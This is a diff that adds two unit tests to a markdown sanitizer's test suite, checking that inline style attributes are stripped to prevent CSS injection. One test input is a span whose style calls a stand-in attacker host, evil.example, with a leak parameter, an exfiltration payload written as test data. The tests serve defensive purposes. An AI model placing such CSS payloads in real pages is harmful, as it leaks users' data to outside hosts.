@@ -318,4 +318,22 @@ describe('sanitize helper', () => {
     expect(result).not.toContain('foreignObject');
     expect(result).not.toContain('<script');
   });
+
+  // F-005: verify that inline style attributes are stripped by the default
+  // sanitize profile. The chat/MarkdownBlock.vue previously whitelisted the
+  // `style` attribute, enabling CSS injection. This test asserts the correct
+  // behaviour: inline styles must not pass through the sanitizer.
+  it('F-005: default profile: strips inline style attributes (CSS injection prevention)', async () => {
+    const { sanitize } = await import('@/lib/markdown/sanitize');
+    const result = sanitize('<span style="background:url(https://evil.example/x?leak=1)">text</span>');
+    expect(result).not.toContain('style=');
+    expect(result).toContain('text');
+  });
+
+  it('F-005: katex profile: strips inline style on non-math elements', async () => {
+    const { sanitize } = await import('@/lib/markdown/sanitize');
+    const result = sanitize('<p style="color:red;font-size:200%">phish</p>', 'katex');
+    expect(result).not.toContain('style=');
+    expect(result).toContain('phish');
+  });
 });
